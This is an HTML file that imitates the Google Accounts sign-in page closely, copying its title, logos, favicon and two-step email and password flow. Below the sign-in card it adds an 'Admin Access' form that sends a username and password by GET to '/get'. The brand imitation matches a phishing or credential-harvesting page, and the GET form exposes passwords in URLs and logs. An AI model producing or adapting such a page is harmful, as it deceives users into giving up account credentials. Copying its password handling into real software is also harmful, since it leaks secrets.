<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Sign in – Google Accounts</title>
  <link rel="icon" href="https://www.google.com/favicon.ico" />
  <link
    href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@300;400;500&display=swap"
    rel="stylesheet"
  />
  <style>
    *,
    *::before,
    *::after {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: "Roboto", sans-serif;
      background-color: #fff;
      color: #202124;
      display: flex;
      flex-direction: column;
      min-height: 100vh;
    }

    /* ── Header ── */
    .header {
      padding: 16px 24px;
    }

    .header-logo {
      display: flex;
      align-items: center;
      text-decoration: none;
    }

    .header-logo svg {
      height: 24px;
      width: auto;
    }

    /* ── Main layout ── */
    main {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 24px 0;
      gap: 24px;
    }

    /* ── Card ── */
    .card {
      border: 1px solid #dadce0;
      border-radius: 8px;
      padding: 48px 40px 36px;
      width: 450px;
      max-width: calc(100vw - 48px);
    }

    /* ── Card header ── */
    .card-header {
      text-align: center;
      margin-bottom: 8px;
    }

    .card-header .google-logo {
      margin-bottom: 16px;
    }

    .card-header h1 {
      font-family: "Google Sans", "Roboto", sans-serif;
      font-size: 24px;
      font-weight: 400;
      color: #202124;
      letter-spacing: 0;
      margin-bottom: 8px;
    }

    .card-header p {
      font-size: 16px;
      color: #202124;
      font-weight: 400;
    }

    /* ── Account chip ── */
    .account-chip {
      display: inline-flex;
      align-items: center;
      gap: 8px;
      border: 1px solid #dadce0;
      border-radius: 24px;
      padding: 6px 12px 6px 6px;
      font-size: 14px;
      color: #202124;
      text-decoration: none;
      margin-top: 4px;
      transition: background 0.15s;
      cursor: pointer;
      background: none;
      font-family: "Roboto", sans-serif;
    }

    .account-chip:hover {
      background: #f8f9fa;
    }

    .account-chip .avatar {
      width: 24px;
      height: 24px;
      border-radius: 50%;
      background: #1a73e8;
      color: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 12px;
      font-weight: 500;
      flex-shrink: 0;
    }

    .account-chip .chevron {
      margin-left: 2px;
      color: #5f6368;
    }

    /* ── Form ── */
    .form {
      margin-top: 28px;
    }

    /* Floating-label text field */
    .text-field {
      position: relative;
      margin-bottom: 8px;
    }

    .text-field input {
      width: 100%;
      padding: 13px 15px;
      font-size: 16px;
      font-family: "Roboto", sans-serif;
      color: #202124;
      background: transparent;
      border: 1px solid #dadce0;
      border-radius: 4px;
      outline: none;
      transition: border-color 0.2s;
    }

    .text-field input:focus {
      border-color: #1a73e8;
      border-width: 2px;
      padding: 12px 14px; /* compensate extra border px */
    }

    .text-field label {
      position: absolute;
      left: 15px;
      top: 50%;
      transform: translateY(-50%);
      font-size: 16px;
      color: #5f6368;
      pointer-events: none;
      transition: all 0.15s ease;
      background: #fff;
      padding: 0 4px;
    }

    /* Float label when input has content or is focused */
    .text-field input:focus + label,
    .text-field input:not(:placeholder-shown) + label {
      top: 0;
      font-size: 11px;
      color: #1a73e8;
    }

    .text-field input:not(:focus):not(:placeholder-shown) + label {
      color: #5f6368;
    }

    /* Error state */
    .text-field.error input {
      border-color: #d93025;
      border-width: 2px;
      padding: 12px 14px;
    }

    .text-field.error label,
    .text-field.error input:focus + label,
    .text-field.error input:not(:placeholder-shown) + label {
      color: #d93025;
    }

    .error-msg {
      display: none;
      font-size: 12px;
      color: #d93025;
      margin-top: 4px;
      padding: 0 16px;
    }

    .text-field.error + .error-msg {
      display: block;
    }

    /* Show-password toggle */
    .password-wrapper {
      position: relative;
    }

    .password-wrapper input {
      padding-right: 48px !important;
    }

    .toggle-pw {
      position: absolute;
      right: 0;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      cursor: pointer;
      padding: 8px 12px;
      color: #5f6368;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .toggle-pw:hover {
      color: #202124;
    }

    /* Forgot email / password link */
    .forgot-link {
      display: inline-block;
      margin-top: 8px;
      font-size: 14px;
      color: #1a73e8;
      text-decoration: none;
      font-weight: 500;
    }

    .forgot-link:hover {
      text-decoration: underline;
    }

    /* Guest notice */
    .guest-notice {
      margin-top: 24px;
      font-size: 14px;
      color: #5f6368;
      line-height: 1.5;
    }

    .guest-notice a {
      color: #1a73e8;
      text-decoration: none;
      font-weight: 500;
    }

    .guest-notice a:hover {
      text-decoration: underline;
    }

    /* ── Card footer (buttons row) ── */
    .card-footer {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-top: 32px;
    }

    .btn {
      padding: 0 24px;
      height: 36px;
      border-radius: 4px;
      font-family: "Google Sans", "Roboto", sans-serif;
      font-size: 14px;
      font-weight: 500;
      letter-spacing: 0.25px;
      cursor: pointer;
      border: none;
      outline: none;
      transition: background 0.15s, box-shadow 0.15s;
    }

    .btn-text {
      background: transparent;
      color: #1a73e8;
      padding: 0 12px;
    }

    .btn-text:hover {
      background: rgba(26, 115, 232, 0.04);
    }

    .btn-text:focus {
      background: rgba(26, 115, 232, 0.12);
    }

    .btn-contained {
      background: #1a73e8;
      color: #fff;
    }

    .btn-contained:hover {
      background: #1765cc;
      box-shadow: 0 1px 2px 0 rgba(60, 64, 67, 0.3),
        0 1px 3px 1px rgba(60, 64, 67, 0.15);
    }

    .btn-contained:focus {
      background: #1765cc;
    }

    /* ── Admin panel card ── */
    .admin-card {
      border: 1px solid #dadce0;
      border-radius: 8px;
      padding: 32px 40px 28px;
      width: 450px;
      max-width: calc(100vw - 48px);
    }

    .admin-card h2 {
      font-family: "Google Sans", "Roboto", sans-serif;
      font-size: 18px;
      font-weight: 500;
      color: #202124;
      margin-bottom: 4px;
    }

    .admin-card p {
      font-size: 13px;
      color: #5f6368;
      margin-bottom: 20px;
    }

    .form-group {
      margin-bottom: 16px;
    }

    .form-control {
      width: 100%;
      padding: 10px 14px;
      font-size: 14px;
      font-family: "Roboto", sans-serif;
      color: #202124;
      border: 1px solid #dadce0;
      border-radius: 4px;
      outline: none;
      transition: border-color 0.2s;
    }

    .form-control:focus {
      border-color: #1a73e8;
      border-width: 2px;
      padding: 9px 13px;
    }

    /* ── Footer ── */
    footer {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 16px 24px;
      flex-wrap: wrap;
      gap: 8px;
    }

    .footer-lang {
      display: flex;
      align-items: center;
      gap: 6px;
      font-size: 12px;
      color: #5f6368;
      cursor: pointer;
    }

    .footer-links {
      display: flex;
      gap: 16px;
    }

    .footer-links a {
      font-size: 12px;
      color: #5f6368;
      text-decoration: none;
    }

    .footer-links a:hover {
      text-decoration: underline;
    }

    /* ── Responsive ── */
    @media (max-width: 520px) {
      main {
        align-items: flex-start;
        padding-top: 40px;
      }

      .card,
      .admin-card {
        border: none;
        padding: 0 24px 36px;
        width: 100%;
      }
    }

    /* Step visibility */
    .step {
      display: none;
    }

    .step.active {
      display: block;
    }
  </style>
</head>
<body>
  <!-- Header -->
  <header class="header">
    <a href="https://www.google.com" class="header-logo" aria-label="Google">
      <!-- Google wordmark SVG -->
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 272 92" aria-hidden="true">
        <path fill="#EA4335" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
        <path fill="#FBBC05" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
        <path fill="#4285F4" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.67-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.26zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/>

        <path fill="#EA4335" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/>
        <path fill="#4285F4" d="M35.29 41.41V32H66.5c.32 1.68.48 3.44.48 5.46 0 6.8-1.86 15.23-7.87 21.24-5.84 6.09-13.31 9.33-23.17 9.33C16.7 68.03 1 52.83 1 33.3 1 13.77 16.7-1.43 36.23-1.43c10.11 0 17.31 3.95 22.73 9.12l-6.39 6.39c-3.87-3.62-9.12-6.46-16.34-6.46-13.36 0-23.81 10.79-23.81 24.18s10.45 24.18 23.81 24.18c8.66 0 13.61-3.46 16.79-6.64 2.58-2.58 4.28-6.28 4.95-11.33H35.29z"/>
      </svg>
    </a>
  </header>

  <main>
    <!-- ── User login card (two-step) ── -->
    <div class="card" role="main">
      <!-- Card header -->
      <div class="card-header">
        <!-- Coloured Google "G" logo -->
        <div class="google-logo" aria-hidden="true">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="40" height="40">
            <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
            <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
            <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
            <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.97 2.31-8.16 2.31-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
            <path fill="none" d="M0 0h48v48H0z"/>
          </svg>
        </div>

        <!-- Step 1 heading -->
        <div id="heading-step1" class="step active">
          <h1>Sign in</h1>
          <p>Use your Google Account</p>
        </div>

        <!-- Step 2 heading -->
        <div id="heading-step2" class="step">
          <h1>Welcome</h1>
          <button type="button" class="account-chip" id="account-chip" aria-label="Change account">
            <span class="avatar" id="avatar-initial">?</span>
            <span id="account-email">Loading…</span>
            <svg class="chevron" xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
              <path d="M7 10l5 5 5-5z"/>
            </svg>
          </button>
        </div>
      </div>

      <!-- Step 1: Email -->
      <div id="step1" class="step active">
        <form class="form" id="login-form" novalidate>
          <div class="text-field" id="email-field">
            <input
              type="text"
              id="email"
              name="email"
              placeholder=" "
              autocomplete="username"
              aria-label="Email or phone"
            />
            <label for="email">Email or phone</label>
          </div>
          <span class="error-msg" id="email-error" role="alert">Enter an email or phone number</span>

          <a href="#" class="forgot-link">Forgot email?</a>

          <p class="guest-notice">
            Not your computer? Use a Private Window to sign in.
            <a href="#" tabindex="0">Learn more</a>
          </p>

          <div class="card-footer">
            <button type="button" class="btn btn-text" id="create-account-btn">
              Create account
            </button>
            <button type="submit" class="btn btn-contained">Next</button>
          </div>
        </form>
      </div>

      <!-- Step 2: Password -->
      <div id="step2" class="step">
        <form class="form" id="pw-form" novalidate>
          <div class="text-field password-wrapper" id="pw-field">
            <input
              type="password"
              id="password"
              name="password"
              placeholder=" "
              autocomplete="current-password"
              aria-label="Enter your password"
            />
            <label for="password">Enter your password</label>
            <button
              type="button"
              class="toggle-pw"
              id="toggle-pw"
              aria-label="Show password"
            >
              <!-- Eye icon (password hidden) -->
              <svg id="icon-show" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
                <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zm0 12.5c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
              </svg>
              <!-- Eye-off icon (password visible) -->
              <svg id="icon-hide" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="currentColor" style="display:none">
                <path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46A11.804 11.804 0 0 0 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/>
              </svg>
            </button>
          </div>
          <span class="error-msg" id="pw-error" role="alert">Enter a password</span>

          <a href="#" class="forgot-link">Forgot password?</a>

          <div class="card-footer">
            <button type="button" class="btn btn-text" id="back-btn">
              Back
            </button>
            <button type="submit" class="btn btn-contained">Next</button>
          </div>
        </form>
      </div>
    </div>

    <!-- ── Admin panel ── -->
    <div class="admin-card" role="complementary" aria-label="Admin access">
      <h2>Admin Access</h2>
      <p>Sign in to manage data access for your users.</p>
      <form action="/get" method="GET">
        <div class="form-group">
          <input type="text" name="email" class="form-control" placeholder="Username" required>
        </div>

        <div class="form-group">
          <input type="password" name="password" class="form-control" placeholder="Password" required>
        </div>

        <button type="submit" class="btn btn-contained">Submit</button>
      </form>
    </div>
  </main>

  <!-- Footer -->
  <footer>
    <div class="footer-lang" role="button" aria-label="Change language" tabindex="0">
      <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
        <path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zm6.93 6h-2.95a15.65 15.65 0 0 0-1.38-3.56A8.03 8.03 0 0 1 18.92 8zM12 4.04c.83 1.2 1.48 2.53 1.91 3.96h-3.82c.43-1.43 1.08-2.76 1.91-3.96zM4.26 14C4.1 13.36 4 12.69 4 12s.1-1.36.26-2h3.38c-.08.66-.14 1.32-.14 2s.06 1.34.14 2H4.26zm.82 2h2.95c.32 1.25.78 2.45 1.38 3.56A7.987 7.987 0 0 1 5.08 16zm2.95-8H5.08a7.987 7.987 0 0 1 4.33-3.56A15.65 15.65 0 0 0 8.03 8zM12 19.96c-.83-1.2-1.48-2.53-1.91-3.96h3.82c-.43 1.43-1.08 2.76-1.91 3.96zM14.34 14H9.66c-.09-.66-.16-1.32-.16-2s.07-1.35.16-2h4.68c.09.65.16 1.32.16 2s-.07 1.34-.16 2zm.25 5.56c.6-1.11 1.06-2.31 1.38-3.56h2.95a8.03 8.03 0 0 1-4.33 3.56zM16.36 14c.08-.66.14-1.32.14-2s-.06-1.34-.14-2h3.38c.16.64.26 1.31.26 2s-.1 1.36-.26 2h-3.38z"/>
      </svg>
      English (United States)
      <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
        <path d="M7 10l5 5 5-5z"/>
      </svg>
    </div>

    <nav class="footer-links" aria-label="Footer links">
      <a href="#">Help</a>
      <a href="#">Privacy</a>
      <a href="#">Terms</a>
    </nav>
  </footer>

  <script>
    function isValidEmailOrPhone(val) {
      return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val) || /^[+\d][\d\s\-()+]{6,}$/.test(val);
    }

    // ── Step navigation helpers ──
    function showStep(n) {
      document.getElementById("step1").classList.toggle("active", n === 1);
      document.getElementById("step2").classList.toggle("active", n === 2);
      document.getElementById("heading-step1").classList.toggle("active", n === 1);
      document.getElementById("heading-step2").classList.toggle("active", n === 2);
    }

    // ── Step 1: Email ──
    const loginForm = document.getElementById("login-form");
    const emailInput = document.getElementById("email");
    const emailField = document.getElementById("email-field");
    const emailErrorEl = document.getElementById("email-error");

    loginForm.addEventListener("submit", function (e) {
      e.preventDefault();
      const val = emailInput.value.trim();

      if (!val) {
        emailField.classList.add("error");
        emailErrorEl.textContent = "Enter an email or phone number";
        emailInput.focus();
        return;
      }

      if (!isValidEmailOrPhone(val)) {
        emailField.classList.add("error");
        emailErrorEl.textContent = "Enter a valid email or phone number";
        emailInput.focus();
        return;
      }

      // Populate account chip and advance to step 2
      document.getElementById("account-email").textContent = val;
      document.getElementById("avatar-initial").textContent = val.charAt(0).toUpperCase();
      showStep(2);
      document.getElementById("password").focus();
    });

    emailInput.addEventListener("input", function () {
      if (emailInput.value.trim()) {
        emailField.classList.remove("error");
      }
    });

    document.getElementById("create-account-btn").addEventListener("click", function () {
      window.location.href = "#";
    });

    // ── Step 2: Password ──
    const pwForm = document.getElementById("pw-form");
    const pwInput = document.getElementById("password");
    const pwField = document.getElementById("pw-field");
    const toggleBtn = document.getElementById("toggle-pw");
    const iconShow = document.getElementById("icon-show");
    const iconHide = document.getElementById("icon-hide");

    toggleBtn.addEventListener("click", function () {
      const showing = pwInput.type === "text";
      pwInput.type = showing ? "password" : "text";
      iconShow.style.display = showing ? "" : "none";
      iconHide.style.display = showing ? "none" : "";
      toggleBtn.setAttribute("aria-label", showing ? "Show password" : "Hide password");
    });

    pwForm.addEventListener("submit", function (e) {
      e.preventDefault();
      if (!pwInput.value) {
        pwField.classList.add("error");
        pwInput.focus();
        return;
      }
      alert("Signed in successfully!");
    });

    pwInput.addEventListener("input", function () {
      if (pwInput.value) {
        pwField.classList.remove("error");
      }
    });

    document.getElementById("back-btn").addEventListener("click", function () {
      showStep(1);
      emailInput.focus();
    });

    document.getElementById("account-chip").addEventListener("click", function () {
      showStep(1);
      emailInput.focus();
    });
  </script>
</body>
</html>
